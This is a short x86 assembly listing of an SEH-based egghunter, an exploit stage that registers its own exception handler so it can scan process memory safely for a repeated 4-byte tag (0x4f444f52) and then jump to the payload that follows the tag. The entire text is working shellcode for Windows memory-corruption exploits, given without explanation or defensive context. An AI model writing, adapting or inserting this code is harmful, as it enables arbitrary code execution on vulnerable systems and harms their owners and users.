_start:
    jmp get_seh_address
build_exception_record:
    pop ecx
    mov eax,0x4f444f52
    push ecx
    push 0xffffffff
    xor ebx,ebx
    mov dword ptr fs:[ebx],esp
    sub ecx, 0x04
    add ebx, 0x04
    mov dword ptr fs:[ebx],ecx
is_egg:
    push 0x2
    pop ecx
    mov edi, ebx
    repe scasd
    jnz loop_inc_one
    jmp edi
loop_inc_page:
    or bx, 0xfff
loop_inc_one:
    inc ebx
    jmp is_egg
get_seh_address:
    call build_exception_record
    push 0x0c
    pop ecx
    mov eax, [esp+ecx]
    mov cl, 0xb8
    add dword ptr ds:[eax+ecx], 0x06
    pop eax
    add esp, 0x10
    push eax
    xor eax,eax
    ret
